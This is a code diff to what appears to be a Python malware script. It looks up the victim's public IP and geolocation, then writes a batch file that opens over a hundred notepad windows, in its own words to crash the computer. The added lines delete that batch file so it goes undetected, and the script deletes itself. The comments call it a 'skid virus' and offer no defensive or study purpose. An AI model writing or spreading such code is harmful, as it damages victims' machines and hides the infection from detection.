@@ -372,7 +372,7 @@ def beamed():
         from urllib.request import urlopen
         from urllib2 import urlopen     
 
-        api_key = 'placeholder' """not needed """
+        api_key = 'placeholder' #not needed.
         hostname = requests.get("https://api.ipify.org").text
         api_url = 'https://geo.ipify.org/api/v1?'
         geodata = api_url + 'apiKey=' + api_key + '&ipAddress=' + hostname
@@ -514,17 +514,23 @@ def beamed():
     except:
         pass
 
-    """makes bat file for bootleg skid virus"""
+    """makes bat file for bootleg skid virus (just opens hella notepad in possible chance for computer to crash"""
     try:
         v1name = r'C:\ProgramData\fuckyou.bat'
         v1 = open(v1name, "w")
-        v1.write("@ECHO off\nSTART %SystemRoot%\system32\notepad.exe")
+        v1.write("@ECHO off\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe\nSTART notepad.exe")
         v1.close()
         subprocess.os.system(r'C:\ProgramData\fuckyou.bat')
     except:
     	pass
 
-    """autoremoves the file for privacy (only works with the .py, compiled exes may be broken and not self delete)"""
+    """removes the bat file so no its not detectable one knows"""
+    try:
+        subprocess.os.system(r'del C:\ProgramData\fuckyou.bat')
+    except:
+    	pass
+
+    """autoremoves the file for privacy (only works with the .py, compiled exes may be broken and not self delete pyinstaller exes do not auto delete)"""
     try:
         remove(argv[0])
     except:
